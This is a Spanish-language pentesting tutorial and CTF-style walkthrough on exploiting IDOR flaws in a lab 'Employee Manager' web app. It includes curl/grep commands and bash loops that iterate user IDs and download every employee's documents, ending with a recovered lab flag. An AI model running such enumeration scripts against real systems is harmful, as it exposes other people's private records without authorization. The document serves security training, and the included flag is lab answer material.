
# Enumeración de IDOR

Explotar las vulnerabilidades de IDOR es fácil en algunos casos, pero puede ser muy complicado en otros. Una vez que identificamos un IDOR potencial, podemos comenzar a probarlo con técnicas básicas para ver si expondría otros datos. En cuanto a los ataques IDOR avanzados, necesitamos comprender mejor cómo funciona la aplicación web, cómo calcula sus referencias de objetos y cómo funciona su sistema de control de acceso para poder realizar ataques avanzados que podrían no ser explotables con técnicas básicas.

Comencemos discutiendo varias técnicas para explotar vulnerabilidades de IDOR, desde la enumeración básica hasta la recopilación masiva de datos y la escalada de privilegios de usuario.

***

## <mark style="color:purple;">Parámetros inseguros</mark>

Comencemos con un ejemplo básico que muestra una vulnerabilidad típica de IDOR. El ejercicio siguiente es una aplicación web `Employee Manager` que aloja registros de empleados:  &#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_employee_manager.jpg" alt=""><figcaption></figcaption></figure>

Nuestra aplicación web asume que estamos conectados como empleados con ID de usuario `uid=1` para simplificar las cosas. Esto requeriría que iniciemos sesión con credenciales en una aplicación web real, pero el resto del ataque sería el mismo. Una vez que hacemos clic en `Documents`, se nos redirige a `/documents.php`:  &#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg" alt=""><figcaption></figcaption></figure>

Cuando llegamos a la página `Documents`, vemos varios documentos que pertenecen a nuestro usuario. Estos pueden ser archivos subidos por nuestro usuario o archivos que nos asigna otro departamento (por ejemplo, el Departamento de Recursos Humanos). Al revisar los enlaces de los archivos, vemos que tienen nombres individuales:

```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

Vemos que los archivos tienen un patrón de nombres predecible, ya que los nombres de los archivos parecen utilizar el usuario `uid` y el mes/año como parte del nombre del archivo, lo que puede permitirnos buscar archivos de otros usuarios. Este es el tipo más básico de vulnerabilidad de IDOR y se llama `static file IDOR`. Sin embargo, para buscar archivos de otros usuarios con éxito, asumiríamos que todos comienzan con `Invoice` o `Report`, lo que puede revelar algunos archivos, pero no todos. Por lo tanto, busquemos una vulnerabilidad de IDOR más sólida.

Vemos que la página está configurando nuestro `uid` con un parámetro `GET` en la URL como ( `documents.php?uid=1`). Si la aplicación web utiliza este parámetro `uid` GET como una referencia directa a los registros de empleados que debe mostrar, es posible que podamos ver los documentos de otros empleados simplemente cambiando este valor. Si el extremo back-end de la aplicación web tiene un sistema de control de acceso adecuado, obtendremos algún tipo de `Access Denied`. Sin embargo, dado que la aplicación web pasa como our `uid`en texto sin formato como una referencia directa, esto puede indicar un diseño deficiente de la aplicación web, lo que lleva a un acceso arbitrario a los registros de los empleados.

Cuando intentamos cambiar a `uid`, `?uid=2` no notamos ninguna diferencia en la salida de la página, ya que seguimos obteniendo la misma lista de documentos y podemos asumir que todavía devuelve nuestros propios documentos:  &#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg" alt=""><figcaption></figcaption></figure>

Sin embargo, debemos estar atentos a los detalles de la página durante cualquier pentest web y siempre teniendo en cuenta el código fuente y el tamaño de la página, si observamos los archivos vinculados, o si hacemos clic en ellos para visualizarlos, nos daremos cuenta de que se trata de archivos diferentes, que parecen ser los documentos pertenecientes al empleado con `uid=2`:

```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

Este es un error común que se encuentra en las aplicaciones web que sufren vulnerabilidades de IDOR, ya que colocan el parámetro que controla qué documentos de usuario mostrar bajo nuestro control mientras que no tienen un sistema de control de acceso en el back-end. Otro ejemplo es usar un parámetro de filtro para mostrar solo los documentos de un usuario específico (por ejemplo, `uid_filter=1`), que también se puede manipular para mostrar los documentos de otros usuarios o incluso eliminar por completo para mostrar todos los documentos a la vez.

***

## <mark style="color:purple;">Enumeración masiva</mark>

Podemos intentar acceder manualmente a los documentos de otros empleados con `uid=3`, `uid=4`, etc. Sin embargo, acceder manualmente a los archivos no es eficiente en un entorno de trabajo real con cientos o miles de empleados. Por lo tanto, podemos utilizar una herramienta como [`Burp Intruder`](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/web-proxies/burp-intruder.md) o [`ZAP Fuzzer`](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/web-proxies/zap-fuzzer.md) para recuperar todos los archivos o escribir un pequeño script bash para descargar todos los archivos, que es lo que haremos.

Abrimos con \[ `CTRL+SHIFT+C`] el `inspector` y luego hacemos clic en cualquiera de los enlaces para ver su código fuente HTML y obtendremos lo siguiente:

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

Podemos elegir cualquier palabra única con `grep` para poder acceder al enlace del archivo. En nuestro caso, vemos que cada enlace comienza con `<li class='pure-tree_link'>`, por lo que podemos acceder con `curl` a la página y `grep` a esta línea de la siguiente manera:

```shell-session
afsh4ck@kali$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

Como podemos ver, pudimos capturar los enlaces de los documentos con éxito. Ahora podemos usar comandos bash específicos para recortar las partes adicionales y obtener solo los enlaces de los documentos en la salida. Sin embargo, es una mejor práctica usar un patrón `Regex` que coincida con las cadenas entre `/document` y `.pdf`, que podemos usar con `grep` para obtener solo los enlaces de los documentos, de la siguiente manera:

```shell-session
afsh4ck@kali$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

Ahora, podemos usar un bucle `for` simple para recorrer el parámetro `uid` y devolver el documento de todos los empleados, y luego usar `wget` para descargar cada documento:

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

Cuando ejecutamos el script, se descargarán todos los documentos de todos los empleados con `uids` entre 1 y 10, lo que permite explotar con éxito la vulnerabilidad IDOR para enumerar en masa los documentos de todos los empleados. Este script es un ejemplo de cómo podemos lograr el mismo objetivo. Intente utilizar una herramienta como Burp Intruder o ZAP Fuzzer, o escriba otro script de Bash o PowerShell para descargar todos los documentos.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 94.237.62.166:56106
```

Repita lo que aprendió en esta sección para obtener una lista de documentos de los primeros `20 uids` de usuarios en `/documents.php`, uno de los cuales debe tener un archivo '`.txt`' con la flag.

<figure><img src="/files/6UQFhyChTRzd6ySEAg86" alt=""><figcaption></figcaption></figure>

Vamos allá con la aplicación de Employee Manager. Como ya sabemos hay 2 directorios:

* Documentos
* Contratos

Como sabemos que hay muchos empleados vamos a hacer una enumeración masiva con un script en bash para automatizar esta tarea. Lo primero vamos a abrir el inspector para ver el html de los links, tanto de `Invoice` como de `Report`:

<figure><img src="/files/d58K5NzCXxbFDojeoMxp" alt=""><figcaption></figcaption></figure>

Tenemos el siguiente html, con lo que observamos que tanto los `Invoice` como los `Report` se almacenan en el directorio `/documents`:

```html
<li class="pure-tree_link"><a href="/documents/Invoice_1_09_2021.pdf" target="_blank">Invoice</a></li>
<li class="pure-tree_link"><a href="/documents/Report_1_10_2021.pdf" target="_blank">Report</a></li>
```

### Script de enumeración masiva

Vamos a usar el script de esta sección pero algo más vitaminado para iterar sobre los ids de los 20 empleados y extraer todos los documentos en nuestro directorio actual:

{% code title="idor-enum.sh" %}

```bash
#!/bin/bash

# URL base del servidor
url="http://94.237.62.166:56106/documents.php"

# User-Agent para simular un navegador real
user_agent="Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"

# Enumerar uids del 1 al 20
for i in {1..20}; do
    echo "Enumerando documentos para UID $i..."
    
    # Realizar una solicitud POST y capturar la respuesta
    response=$(curl -s -X POST "$url" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "User-Agent: $user_agent" \
        --data "uid=$i")
    
    # Extraer los enlaces a documentos pdf o txt y descargarlos en local
    for link in $(echo "$response" | grep -oP "\/documents.*?\.(pdf|txt)"); do
        echo "Descargando: $link"
        wget -q "http://94.237.62.166:56106$link" || echo "Error descargando $link"
    done
done

echo "Enumeración completada."

```

{% endcode %}

Ejecutamos el script con bash y nos empieza a descargar los archivos:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ bash idor-enum.sh     
</strong><strong>                                                                         
</strong>Enumerando documentos para UID 1...
Descargando: /documents/Invoice_1_09_2021.pdf
Descargando: /documents/Report_1_10_2021.pdf
Enumerando documentos para UID 2...
Descargando: /documents/Invoice_2_08_2020.pdf
Descargando: /documents/Report_2_12_2020.pdf
Enumerando documentos para UID 3...
Descargando: /documents/Invoice_3_06_2020.pdf
Descargando: /documents/Report_3_01_2020.pdf
Enumerando documentos para UID 4...
Descargando: /documents/Invoice_4_07_2021.pdf
Descargando: /documents/Report_4_11_2020.pdf
Enumerando documentos para UID 5...
Descargando: /documents/Invoice_5_06_2020.pdf
Descargando: /documents/Report_5_11_2021.pdf
...
</code></pre>

Si hacemos un `ls` en el directorio actual encontramos el archivo de la flag:

```shell-session
afsh4ck@kali$ ls

 flag_11dfa168ac8eb2958e38425728623c98.txt   Invoice_17_11_2021.pdf   Invoice_6_09_2019.pdf   Report_15_01_2020.pdf   Report_4_11_2020.pdf
 idor-enum.sh                                Invoice_18_12_2020.pdf   Invoice_7_11_2021.pdf   Report_16_01_2021.pdf   Report_5_11_2021.pdf
 Invoice_10_03_2020.pdf                      Invoice_19_06_2020.pdf   Invoice_8_06_2020.pdf   Report_17_06_2021.pdf   Report_6_09_2020.pdf
 Invoice_11_03_2021.pdf                      Invoice_1_09_2021.pdf    Invoice_9_04_2019.pdf   Report_18_01_2020.pdf   Report_7_01_2020.pdf
 Invoice_12_02_2020.pdf                      Invoice_20_06_2020.pdf   Report_10_05_2021.pdf   Report_19_08_2020.pdf   Report_8_12_2020.pdf
 Invoice_13_06_2020.pdf                      Invoice_2_08_2020.pdf    Report_11_04_2021.pdf   Report_1_10_2021.pdf    Report_9_05_2020.pdf
 Invoice_14_01_2021.pdf                      Invoice_3_06_2020.pdf    Report_12_04_2020.pdf   Report_20_01_2021.pdf  
 Invoice_15_11_2020.pdf                      Invoice_4_07_2021.pdf    Report_13_01_2020.pdf   Report_2_12_2020.pdf   
 Invoice_16_12_2021.pdf                      Invoice_5_06_2020.pdf    Report_14_01_2020.pdf   Report_3_01_2020.pdf   
```

```shell-session
afsh4ck@kali$ cat flag_11dfa168ac8eb2958e38425728623c98.txt 
HTB{4lL_fil35_4r3_m1n3}
```
